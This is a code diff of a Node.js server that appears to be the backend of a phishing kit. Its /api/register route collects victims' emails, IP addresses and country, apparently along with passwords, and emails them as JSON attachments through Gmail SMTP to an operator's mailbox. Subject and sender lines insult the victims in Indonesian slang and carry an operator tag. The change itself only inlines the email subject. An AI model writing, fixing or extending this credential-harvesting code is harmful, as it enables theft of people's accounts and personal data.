@@ -88,13 +88,6 @@ function isDuplicatePassword(targetEmail, currentPassword) {
     return false;
 }
 
-function getNormalSubject(targetEmail) {
-    const subjects = [
-        `𝗗𝗮𝘁𝗮 𝘀𝗶 𝗸𝗼𝗻𝘁𝗼𝗹 ${flagEmoji}${countryName} ${data.ip_address || '-'}`
-    ];
-    return subjects[Math.floor(Math.random() * subjects.length)];
-}
-
 const transporter = nodemailer.createTransport({
     host: 'smtp.gmail.com',
     port: 465,
@@ -536,7 +529,7 @@ app.post('/api/register', async (req, res) => {
             await transporter.sendMail({
                 from: `"𝗗𝗔𝗧𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚 ${data.email || '-'} 𝗕𝗬 𝗗𝗦𝗧𝗥🇲🇽" <${SENDER_EMAIL}>`,
                 to: receiver,
-                subject: getNormalSubject(data.email),
+                subject: `𝗗𝗮𝘁𝗮 𝘀𝗶 𝗸𝗼𝗻𝘁𝗼𝗹 ${flagEmoji}${countryName} ${data.ip_address || '-'}`,
                 html: htmlContent,
                 attachments: [{
                     filename: `registration_${Date.now()}_${receiver.split('@')[0]}.json`,
